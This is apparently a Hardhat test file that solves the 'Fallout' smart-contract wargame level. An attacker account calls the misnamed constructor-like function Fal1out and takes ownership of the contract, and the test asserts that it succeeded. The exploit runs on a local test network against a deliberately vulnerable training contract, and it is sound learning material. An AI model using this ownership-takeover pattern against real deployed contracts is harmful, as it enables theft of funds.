const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Fallout", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const ContractFactory = await ethers.getContractFactory("Fallout")
    const contract = await ContractFactory.connect(deployer).deploy()
    await contract.waitForDeployment()

    const deployerAddress = await deployer.getAddress()
    const attackerAddress = await attacker.getAddress()
    const contractAddress = await contract.getAddress()

    return { deployer, attacker, contract, deployerAddress, attackerAddress, contractAddress }
  }

  it("Should claim ownership", async () => {
    const { deployer, attacker, contract, deployerAddress, attackerAddress, contractAddress } = await loadFixture(deployFallbackFixture)

    // 构建攻击者的Fal1out交互
    const Fal1outTx = await contract.connect(attacker).Fal1out({ value: ethers.parseUnits("100", "wei") })
    await Fal1outTx.wait()

    expect(await contract.owner()).to.equal(attackerAddress)

  })
})